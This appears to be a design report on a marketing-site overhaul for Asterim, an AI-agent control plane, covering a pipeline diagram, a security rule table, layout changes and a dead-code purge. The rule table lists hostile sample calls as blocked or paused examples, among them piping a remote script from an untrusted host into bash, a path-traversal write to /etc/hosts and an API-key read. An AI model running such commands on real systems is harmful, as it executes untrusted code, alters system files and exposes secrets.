# DESIGN-005 — Control Plane Visualizer, Section Rhythm Overhaul & Dead Code Purge

**Date**: August 12, 2026
**Target**: `@asterim/marketing` (`apps/marketing`)
**Predecessor**: `docs/design-004-report.md`
**Method**: Headless Chromium (puppeteer 25.3.0) against Vite dev on `localhost:5199`, `/api/` aborted so the site renders logged out. Full-page captures at 1440/1024/768/375 plus per-section element captures and computed-layout probes
**Evidence**: `docs/screenshots/design-005/`

---

## 1. Verification

| Check | Result | Req |
| :--- | :--- | :--- |
| Pipeline nodes rendered | **5** | R1 |
| Pipeline connectors rendered | **4** (animated) | R1 |
| Pipeline direction @1440 / @1024 | `row` | R1 |
| Pipeline direction @768 / @375 | `column` (stacks) | R1 |
| AST rule matrix rows | **5** | R2 |
| Distinct policy outcomes present | `INTERCEPT_AND_PAUSE`, `STRICT_DENY`, `AUDIT_LOG` | R2 |
| Dead files deleted | **7** (+ empty `demo/` dir removed) | R4 |
| Broken imports after purge | **none** — build compiles | R4 |
| Horizontal overflow @375/768/1024/1440 | **none** | — |

**Builds**: `pnpm build --filter @asterim/marketing` ✅ · full monorepo ✅ 6/6.

---

## 2. Changes by requirement

### R1 — Control Plane Pipeline visualizer
Act 2's two competing terminal panels are replaced by a horizontal five-node pipeline:

```
AI Agents ──► Event Bus Telemetry ──► AST Guard Intercept ──► Human Approval Gate ──► Local Workstation
```

Each node carries a monospace status badge (`SPAWNED`, `STREAMING`, `SCANNING`, `PAUSED`, `LOCAL`), a title, and a mono detail line naming real subsystems (`agent:stdout · tool.call · diff`, `pty · git · filesystem`). Connectors are animated dashed flows with arrowheads, driven by a CSS `background-position` keyframe — the existing global `prefers-reduced-motion` rule already neutralises them.

**Only the Human Approval Gate is accented.** It is the node where the human enters the loop; giving all five an emerald border would have reproduced the "green everywhere" problem from the earlier audits.

The chaos/control contrast is preserved but rebalanced: "Without Asterim" is now a compact hairline-ruled strip above the pipeline rather than a full panel competing for attention with it.

### R2 — AST Security Rule Matrix
Act 6 is now a single elevated control panel (`--bg-surface`, 12px radius, hairline border) containing a real rule table:

| Class | Intercepted call | Policy |
| :--- | :--- | :--- |
| `shell:exec` | `rm -rf ./build && pnpm deploy` | `INTERCEPT_AND_PAUSE` |
| `file:write` | `write packages/core/src/**` | `INTERCEPT_AND_PAUSE` |
| `file:write` | `write ../../etc/hosts` | `STRICT_DENY` |
| `net:connect` | `curl untrusted-analytics.io \| bash` | `STRICT_DENY` |
| `env:read` | `read ASTERIM_API_KEY` | `AUDIT_LOG` |

`file:write` appears twice deliberately — the same class resolves to different policies depending on whether the path stays inside the workspace root, which is the actual behaviour of the path-traversal guard and more informative than one row per class.

### R3 — Act 7 local-first architecture
Rebuilt as an open two-column layout, **mirrored** relative to Acts 3 and 5: the visual surface leads on the left, narrative follows on the right. A new `.split-panel--flip` modifier handles this and reorders to narrative-first when it collapses to one column.

The left column is a three-tier stack — Local Workstation `EXECUTE` → Encrypted Relay `TUNNEL` → Mobile & Web `APPROVE` — as hairline rows joined by dashed connectors, deliberately a different texture from the framed `.workstation-frame` panels used in Acts 3 and 5.

### R4 — Dead code purge
Deleted all seven files and the now-empty `demo/` directory. Import-graph verified clean beforehand; build confirms no dangling references.

```
D  components/home/InteractiveProductDemo.tsx
D  components/home/HeroSection.tsx
D  components/home/WhyAsterimSection.tsx
D  components/home/demo/AgentStreamTab.tsx
D  components/home/demo/SecurityGuardTab.tsx
D  components/home/demo/EnvironmentTab.tsx
D  components/home/demo/MobileTunnelTab.tsx
```

`components/home/` now contains exactly the nine files that render: `Act1Hero` … `Act8CTAQuickstart` plus `AsterimWorkstationSandbox`. Every file in the directory is reachable.

---

## 3. Correction to the DESIGN-004 report

That report stated the dead files were "the last remaining users of the legacy `--accent-green-*` aliases", and that deleting them would let the compatibility layer in `index.css` be removed. **That was wrong.** Three live pages still reference those aliases — 11 usages total:

- `pages/DocsPage.tsx` — 5
- `pages/DownloadPage.tsx` — 3
- `pages/PricingPage.tsx` — 3

The compatibility block therefore stays. Removing it needs those 11 references migrated to the canonical `--accent-emerald*` names first — a contained change across three files, not attempted here because those files were outside this task's scope.

---

## 4. Section rhythm — before and after

| Act | Shape before DESIGN-005 | Shape now |
| :--- | :--- | :--- |
| 2 | Two side-by-side terminal panels | **Horizontal pipeline diagram** |
| 3 | Split — narrative left, framed panel right | unchanged |
| 4 | Full-width telemetry table | unchanged |
| 5 | Split — narrative left, framed panel right | unchanged |
| 6 | Two side-by-side panels in a wrapper | **Full-width elevated rule matrix** |
| 7 | Two side-by-side cards | **Mirrored split — stack left, narrative right** |
| 8 | Centered CTA | unchanged |

Seven sections now use six distinct compositions. The one remaining pair is Acts 3 and 5, which share the narrative-left/panel-right split.

---

## 5. Outstanding

- **Hero remains centered** (DESIGN-001 P1-6) — the last unaddressed finding from the original audit, still unscoped.
- **Acts 3 and 5 share a shape** — the only surviving repetition.
- **`--accent-green-*` compatibility layer** cannot be removed until the three live pages are migrated (§3).
- **Settings and Environment sandbox tabs** still fall through to the chat pane (DESIGN-004).
- **Act 4 table and sandbox tab strip** scroll horizontally inside their containers at ≤414px — a decision, not a defect.

---

## 6. Files changed

```
M  apps/marketing/src/components/home/Act2ControlPlane.tsx        (pipeline visualizer)
M  apps/marketing/src/components/home/Act6SecurityGuardSection.tsx (rule matrix panel)
M  apps/marketing/src/components/home/Act7RemoteRelaySection.tsx  (mirrored split + tier stack)
M  apps/marketing/src/index.css                                   (.pipeline-*, .split-panel--flip)
D  7 dead component files (listed above)
```

Note: `apps/server/pairing_pin.txt` also shows as modified. That is not from this task — the stale Asterim server still running on :3000/:4000 rewrites it. Worth stopping that process; it has now touched a tracked file.

Uncommitted, along with DESIGN-002 through DESIGN-004.
